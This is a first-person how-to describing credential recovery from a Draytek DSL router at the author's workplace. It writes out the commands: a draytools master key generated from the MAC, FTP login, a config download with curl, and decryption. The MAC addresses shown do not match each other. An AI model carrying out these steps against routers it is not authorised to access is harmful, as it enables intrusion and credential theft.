How To; Recover a Username and Password from a Draytek router.

This is a tale of how frighteningly easy it is to recover a username and
password from a draytek 2820n DSL router using free and opensource tools.

 
At work our DSL is provided by a local telecoms company and they also supply the
DSL modem.

Friday afternoon I rang the telecoms company to get them to open a couple of
ports and forward them to an IP on the LAN for a project I'm working on. The
support guy couldn't find any information or record of them supplying the modem
and therefore it must have been installed by my company (read me). After
explaining that the modem had stickers with the name of the telecoms company on
both sides of the thing and I was more than happy to do the configuration myself
if they could supply the username and password, we settled on doing a factory
reset on the router and they would send me an email with the radius settings so
I could set it back up.

The email arrived with the settings I needed and I was all set to push the
little reset button, but I thought hmmm, how hard would it be to try and hack
the thing???

20 seconds later and the google had returned the search results for 'recover
password from dratek router'. There was a whirlpool forum post that looked
promising. In it was a link to a suite of tools at github. Written in python2
and released under a GPL3 licence.

A quick read of the README on the github page and I fired up a terminal and
issued a git clone.

...git clone https://github.com/ammonium/draytools/ draytools

I then needed the mac of the router I was connected to.

..[ marshall ][ ~ ]
... arp -a
? (192.168.1.1) at 00:18:39:aa:46:e7 [ether] on eth0

Using the mac with draytools I could generate the ftp master password

..[ marshall ][ ~ ]
... python2 draytools.py -m 00:18:39:aa:46:e2
Username  :    admin
Master key:    QkWwDrUq

Well, this was going far to well to actually work.
Or so I thought.

Next was to try and login to the router via ftp.

..[ marshall ][ ~ ]
...ftp 192.168.1.1
User (ROUTER_IP:(none)): admin
331 Enter PASS command
Password:
230 Logged in
ftp> ls
200 Port command okay
150 Opening data connection for NLST
v3320_3.3.4.1_333201.cfg
v3320_3.3.4.1_333201.all

Oo It worked!

So all I had to do was grab the .cfg file with curl

..[ marshall ][ ~ ]
...curl ftp://192.168.1.1/v3320_3.3.4.1_333201.cfg -o v3320_3.3.4.1_333201.cfg

and run

..[ marshall ][ ~ ]
... python2 draytools.py -p v3320_3.3.4.1_333201.cfg
